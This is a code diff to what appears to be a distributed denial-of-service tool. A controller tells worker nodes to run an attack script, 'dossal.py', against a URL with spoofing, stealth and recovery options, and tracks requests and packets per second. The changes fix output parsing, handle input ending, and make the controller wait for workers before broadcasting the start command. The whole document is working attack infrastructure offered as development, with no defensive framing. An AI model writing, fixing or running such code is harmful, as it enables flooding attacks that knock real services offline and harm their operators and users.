@@ -75,7 +75,8 @@ def run_worker(controller_addr, node_id, listen_port=9998):
                     args.extend(['--proxy', cmd['proxy']])
                 
                 print(f"[{node_id}] START: {url} mode={mode} threads={threads} spoof={cmd.get('spoof',0)}")
-                proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                # v13.4: dossal.py --live는 stderr에 출력 → stdout으로 통합
+                proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                 stats['status'] = 'running'
                 stats['rps'] = 0
                 stats['packets'] = 0
@@ -84,14 +85,14 @@ def run_worker(controller_addr, node_id, listen_port=9998):
                 def reader():
                     """워커 출력 스레드 (dossal stdout 읽기)."""
                     if proc and proc.stdout:
+                        import re as _re
                         for line in proc.stdout:
                             line = line.strip()
-                        if 'RPS=' in line:
-                            import re
-                            m = re.search(r'RPS=([\d,]+)', line)
+                            # v13.4: RPS/PPS 파싱 (for 루프 안으로 이동)
+                            m = _re.search(r'RPS=([\d,]+)', line)
                             if m:
                                 stats['rps'] = int(m.group(1).replace(',', ''))
-                            m = re.search(r'PPS=([\d,]+)', line)
+                            m = _re.search(r'PPS=([\d,]+)', line)
                             if m:
                                 stats['packets'] = int(m.group(1).replace(',', ''))
                     # Process ended
@@ -256,7 +257,8 @@ def run_controller(port=9999):
         if r:
             line = sys.stdin.readline().strip()
             if not line:
-                continue
+                # v13.4: stdin EOF → 종료
+                break
             
             if line == 'workers':
                 for node, (addr, msg, seen) in workers.items():
@@ -265,6 +267,21 @@ def run_controller(port=9999):
             
             elif line.startswith('start '):
                 url = line[6:].strip()
+                # v13.4: workers가 비어있으면 매 1초 확인, 최대 10초
+                wait = 0
+                while not workers and wait < 10:
+                    print(f"  (waiting for workers... {wait+1}/10)")
+                    time.sleep(1)
+                    wait += 1
+                    # worker 상태 수신 (recvfrom)
+                    try:
+                        _d, _a = sock.recvfrom(65535)
+                        _m = json.loads(_d.decode())
+                        _n = _m.get('node', 'unknown')
+                        workers[_n] = (_a, _m, time.time())
+                        print(f"  [{_n}] registered")
+                    except socket.timeout:
+                        pass
                 cmd = {'cmd': 'start', 'url': url, 'mode': 'auto', 'duration': 30, 'threads': 16, 'spoof': 100, 'stealth': True, 'recovery': True}
                 for node, (addr, _, _) in workers.items():
                     sock.sendto(json.dumps(cmd).encode(), addr)
